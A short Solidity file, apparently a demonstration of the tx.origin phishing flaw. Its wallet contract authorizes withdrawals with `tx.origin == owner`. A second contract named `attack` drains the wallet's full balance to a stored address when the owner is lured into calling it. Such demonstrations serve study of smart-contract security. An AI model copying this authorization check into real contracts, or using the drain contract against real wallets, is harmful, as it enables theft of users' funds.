//SPDX-License-Identifier:MIT

pragma solidity 0.8.7 ;

contract A {
  
    address public owner ; 

    constructor(address _owner){
        owner = _owner;
    }
  
   function deposit() public payable{} 


  function transfer(address payable to , uint amount) public payable {

      require(tx.origin == owner ,  "You are not the owner");

            (bool success, )=to.call{value: amount}("");

            require(success , "Transaction failed");
  }
  
}

contract attack {
  
    A a ;
    address payable xxx ;

    constructor(address _a , address _xxx){
       a =A(_a);
       xxx  = payable(_xxx);
    }


    function attak() public {
       a.transfer(xxx , address(a).balance);
    }

}